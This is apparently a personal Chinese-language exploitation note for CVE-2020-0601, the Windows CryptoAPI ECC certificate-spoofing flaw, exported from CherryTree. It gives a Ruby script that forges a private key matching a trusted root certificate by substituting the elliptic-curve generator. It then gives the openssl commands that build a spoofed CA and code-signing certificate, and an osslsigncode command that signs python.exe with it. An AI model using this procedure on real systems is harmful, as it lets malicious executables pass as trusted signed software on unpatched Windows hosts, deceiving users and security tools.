<!doctype html><html>
    <head>
      <meta http-equiv="content-type" content="text/html; charset=utf-8">
      <title>CVE-2020-0601</title>
      <meta name="generator" content="CherryTree">
      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
    </head>
    <body><div class='page'><h1 class='title'>CVE-2020-0601</h1><br/><a href="https://blog.csdn.net/Eastmount/article/details/104335673">https://blog.csdn.net/Eastmount/article/details/104335673</a><br />使用范围：win server 2016/2019 win10 &lt; 1903<br />c:\windows\System32\Crypt32.dll &lt; 6.2.18362.592<br />利用<br />1、导出ECC根证书。certmgr.msc，选择受信任下的ECC根证书，base64保存<br />2、ruby main.rb eccroot.cer，提取公钥信息<br /><div class="codebox"><div class="codebox">require&nbsp;&#39;openssl&#39;<br /><br />raw&nbsp;=&nbsp;File.read&nbsp;ARGV[0]<br />ca&nbsp;=&nbsp;OpenSSL::X509::Certificate.new(raw)&nbsp;#&nbsp;Read&nbsp;certificate<br />ca_key&nbsp;=&nbsp;ca.public_key&nbsp;#&nbsp;Parse&nbsp;public&nbsp;key&nbsp;from&nbsp;CA<br /><br />ca_key.private_key&nbsp;=&nbsp;1&nbsp;#&nbsp;Set&nbsp;a&nbsp;private&nbsp;key,&nbsp;which&nbsp;will&nbsp;match&nbsp;Q&nbsp;=&nbsp;d&#39;G&#39;<br />group&nbsp;=&nbsp;ca_key.group&nbsp;<br />group.set_generator(ca_key.public_key,&nbsp;group.order,&nbsp;group.cofactor)<br />group.asn1_flag&nbsp;=&nbsp;OpenSSL::PKey::EC::EXPLICIT_CURVE<br />ca_key.group&nbsp;=&nbsp;group&nbsp;#&nbsp;Set&nbsp;new&nbsp;group&nbsp;with&nbsp;fake&nbsp;generator&nbsp;G&#39;&nbsp;=&nbsp;Q<br /><br />File.open(&quot;spoofed_ca.key&quot;,&nbsp;&#39;w&#39;)&nbsp;{&nbsp;|f|&nbsp;f.write&nbsp;ca_key.to_pem&nbsp;}</div></div><br />3、<span style="color:#abb2bf;">openssl req </span><span style="color:#669900;">-</span><span style="color:#c678dd;">new</span><span style="color:#abb2bf;"> </span><span style="color:#669900;">-</span><span style="color:#abb2bf;">x509 </span><span style="color:#669900;">-</span><span style="color:#abb2bf;">key spoofed_ca</span><span style="color:#999999;">.</span><span style="color:#abb2bf;">key </span><span style="color:#669900;">-</span><span style="color:#abb2bf;">out spoofed_ca</span><span style="color:#999999;">.</span><span style="color:#abb2bf;">crt</span><br />生成CA，填写的信息是颁发者的信息<br />4、<span style="color:#abb2bf;">openssl ecparam </span><span style="color:#669900;">-</span><span style="color:#abb2bf;">name secp384r1 </span><span style="color:#669900;">-</span><span style="color:#abb2bf;">genkey </span><span style="color:#669900;">-</span><span style="color:#abb2bf;">noout </span><span style="color:#669900;">-</span><span style="color:#abb2bf;">out cert</span><span style="color:#999999;">.</span><span style="color:#abb2bf;">key</span><br />生成任意证书，用于实际的签名。CA会对该证书进行签名<br />5、<span style="color:#abb2bf;">openssl req </span><span style="color:#669900;">-</span><span style="color:#c678dd;">new</span><span style="color:#abb2bf;"> </span><span style="color:#669900;">-</span><span style="color:#abb2bf;">key cert</span><span style="color:#999999;">.</span><span style="color:#abb2bf;">key </span><span style="color:#669900;">-</span><span style="color:#abb2bf;">out cert</span><span style="color:#999999;">.</span><span style="color:#abb2bf;">csr </span><span style="color:#669900;">-</span><span style="color:#abb2bf;">config openssl_cs</span><span style="color:#999999;">.</span><span style="color:#abb2bf;">conf </span><span style="color:#669900;">-</span><span style="color:#abb2bf;">reqexts v3_cs</span><br />证书签名请求<br />openssl_cs<span style="color:#999999;">.</span><span style="color:#abb2bf;">conf</span>内容：<br />[ req ]<br />prompt = no<br />distinguished_name = dn<br /><br />[ dn ]<br />C = DK<br />ST = Denmark<br />L = Copenhagen<br />O = ollypwn<br />CN = ollypwn<br /><br />[ v3_cs ]<br />basicConstraints        = critical, CA:FALSE<br />subjectKeyIdentifier    = hash<br />keyUsage                = digitalSignature<br />extendedKeyUsage        = codeSigning<br />6、<span style="color:#abb2bf;">openssl x509 </span><span style="color:#669900;">-</span><span style="color:#abb2bf;">req </span><span style="color:#669900;">-</span><span style="color:#abb2bf;">in cert</span><span style="color:#999999;">.</span><span style="color:#abb2bf;">csr </span><span style="color:#669900;">-</span><span style="color:#98c379;">CA</span><span style="color:#abb2bf;"> spoofed_ca</span><span style="color:#999999;">.</span><span style="color:#abb2bf;">crt</span> <span style="color:#669900;">-</span><span style="color:#abb2bf;">CAkey spoofed_ca</span><span style="color:#999999;">.</span><span style="color:#abb2bf;">key </span><span style="color:#669900;">-</span><span style="color:#abb2bf;">CAcreateserial </span><span style="color:#669900;">-</span><span style="color:#abb2bf;">out cert</span><span style="color:#999999;">.</span><span style="color:#abb2bf;">crt </span><span style="color:#669900;">-</span><span style="color:#abb2bf;">days </span><span style="color:#98c379;">10000</span> <span style="color:#669900;">-</span><span style="color:#abb2bf;">extfile openssl_cs</span><span style="color:#999999;">.</span><span style="color:#abb2bf;">conf </span><span style="color:#669900;">-</span><span style="color:#abb2bf;">extensions v3_cs</span><br />生成证书<br />7、<span style="color:#abb2bf;">openssl pkcs12 </span><span style="color:#669900;">-</span><span style="color:#abb2bf;">export </span><span style="color:#669900;">-</span><span style="color:#abb2bf;">in cert</span><span style="color:#999999;">.</span><span style="color:#abb2bf;">crt </span><span style="color:#669900;">-</span><span style="color:#abb2bf;">inkey cert</span><span style="color:#999999;">.</span><span style="color:#abb2bf;">key </span><span style="color:#669900;">-</span><span style="color:#abb2bf;">certfile spoofed_ca</span><span style="color:#999999;">.</span><span style="color:#abb2bf;">crt </span><span style="color:#669900;">-</span><span style="color:#abb2bf;">name </span><span style="color:#669900;">&quot;Code Signing&quot;</span><span style="color:#abb2bf;"> </span><span style="color:#669900;">-</span><span style="color:#abb2bf;">out cert</span><span style="color:#999999;">.</span><span style="color:#abb2bf;">p12</span><br />打包成p12格式<br />8、<span style="color:#abb2bf;">osslsigncode sign </span><span style="color:#669900;">-</span><span style="color:#abb2bf;">pkcs12 cert</span><span style="color:#999999;">.</span><span style="color:#abb2bf;">p12 </span><span style="color:#669900;">-</span><span style="color:#abb2bf;">n </span><span style="color:#669900;">&quot;Signed by ollypwn&quot;</span><span style="color:#abb2bf;"> </span><span style="color:#669900;">-</span><span style="color:#abb2bf;">in python</span><span style="color:#999999;">.</span><span style="color:#abb2bf;">exe </span><span style="color:#669900;">-</span><span style="color:#abb2bf;">out python_signed</span><span style="color:#999999;">.</span><span style="color:#abb2bf;">exe</span><br />对程序签名<br /><p align="center"><img src="images\home.svg" height="22" width="22">  <a href="index.html">索引</a></p></div></body></html>